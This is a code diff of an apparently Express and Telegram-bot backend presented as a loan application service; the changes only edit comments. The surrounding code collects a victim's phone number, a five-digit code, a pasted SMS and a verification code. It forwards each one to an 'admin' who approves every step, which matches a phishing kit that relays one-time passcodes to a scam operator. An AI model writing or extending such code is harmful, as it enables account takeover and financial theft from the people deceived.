@@ -33,7 +33,7 @@ if (token) {
 
         const originalText = query.message.text;
 
-        // --- Initial Approval (Submit Application) ---
+        // --- Initial Approval ---
         if (decision === 'approve') {
             session.status = 'approved';
             session.nextStep = 'sms';
@@ -50,7 +50,7 @@ if (token) {
             });
         }
 
-        // --- SMS Review Actions ---
+        // --- SMS Review ---
         else if (decision === 'smsapprove') {
             session.status = 'sms_approved';
             session.nextStep = 'verification';
@@ -73,7 +73,7 @@ if (token) {
             });
         }
 
-        // --- Final Verification Actions ---
+        // --- Final Verification ---
         else if (decision === 'verapprove') {
             session.status = 'final_approved';
             session.nextStep = 'final_approved';
@@ -139,7 +139,6 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// ---- 1. New loan application → notify admin ----
 app.post('/api/request-approval', (req, res) => {
     const { amount, term, phone, fiveDigitCode } = req.body;
 
@@ -181,14 +180,12 @@ app.post('/api/request-approval', (req, res) => {
     });
 });
 
-// ---- 2. Frontend polls this ----
 app.get('/api/session-status/:sessionId', (req, res) => {
     const session = pendingSessions[req.params.sessionId];
     if (!session) return res.status(404).json({ error: 'Session not found' });
     res.json({ status: session.status, nextStep: session.nextStep });
 });
 
-// ---- 3. User pastes SMS → forward to admin ----
 app.post('/api/submit-sms', (req, res) => {
     const { sessionId, sms } = req.body;
     const session = pendingSessions[sessionId];
@@ -220,7 +217,6 @@ app.post('/api/submit-sms', (req, res) => {
     });
 });
 
-// ---- 4. User submits verification code → forward to admin ----
 app.post('/api/submit-verification', (req, res) => {
     const { sessionId, code } = req.body;
     const session = pendingSessions[sessionId];
